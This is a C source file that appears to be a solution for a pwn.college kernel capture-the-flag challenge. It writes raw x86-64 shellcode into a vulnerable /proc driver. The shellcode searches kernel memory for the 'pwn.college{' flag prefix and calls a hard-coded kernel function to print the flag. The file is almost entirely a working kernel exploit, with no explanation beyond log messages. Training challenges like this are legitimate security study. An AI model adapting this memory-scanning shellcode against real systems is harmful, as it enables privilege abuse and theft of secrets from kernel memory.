#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>

int64_t global_fd;
char global_buf[1024];
char driver[] = "/proc/vuln_driver";

void open_driver() {
        global_fd = open(driver, O_RDWR);
        if (global_fd < 0) {
                printf("[+] Failed to open driver :(\n");
                exit(1);
        } else {
                printf("[+] Driver open\n");
        }
}

void read_flag() {
        int sz;
        global_fd = open("/flag", O_RDONLY);
        sz = read(global_fd, global_buf, sizeof(global_buf));
        if (sz < 0) {
                printf("failed to read flag\n");
        } else {
                close(global_fd);
                printf("%s\n", global_buf);
        }
}

int main() {
        uint8_t f[] = { 
                0x48, 0x83, 0xec, 0x10, 0xc6, 0x04, 0x24, 0x70, 0xc6, 0x44, 0x24, 0x01, 0x77, 0xc6, 0x44, 0x24, 0x02, 0x6e, 0xc6, 0x44, 0x24, 0x03, 0x2e, 0xc6, 0x44, 0x24, 0x04, 0x63, 0xc6, 0x44, 0x24, 0x05, 0x6f, 0xc6, 0x44, 0x24, 0x06, 0x6c, 0xc6, 0x44, 0x24, 0x07, 0x6c, 0xc6, 0x44, 0x24, 0x08, 0x65, 0xc6, 0x44, 0x24, 0x09, 0x67, 0xc6, 0x44, 0x24, 0x0a, 0x65, 0xc6, 0x44, 0x24, 0x0b, 0x7b, 0xc6, 0x44, 0x24, 0x0c, 0x00, 0x48, 0x89, 0xe2,

                0x65, 0x4c, 0x8b, 0x04, 0x25, 0x00, 0x5d, 0x01, 0x00,
                0x49, 0x81, 0xe8, 0x00, 0x00, 0x00, 0x03, 0xeb, 0x04, 0x49, 0x83, 0xc0, 0x10, 0xb9, 0x0c, 0x00, 0x00, 0x00, 0x48, 0x89, 0xd6, 0x4c, 0x89, 0xc7, 0xf3, 0xa6, 0x0f, 0x97, 0xc0, 0x1c, 0x00, 0x84, 0xc0, 0x74, 0x02, 0xeb, 0xe4, 0x4c, 0x89, 0xc7, 0x48, 0xc7, 0xc6, 0x00, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc0, 0x09, 0x63, 0x0b, 0x81, 0xff, 0xd0, 0xc3 };

        open_driver();
        write(global_fd, f, sizeof(f));
        close(global_fd);
        return 0;
}
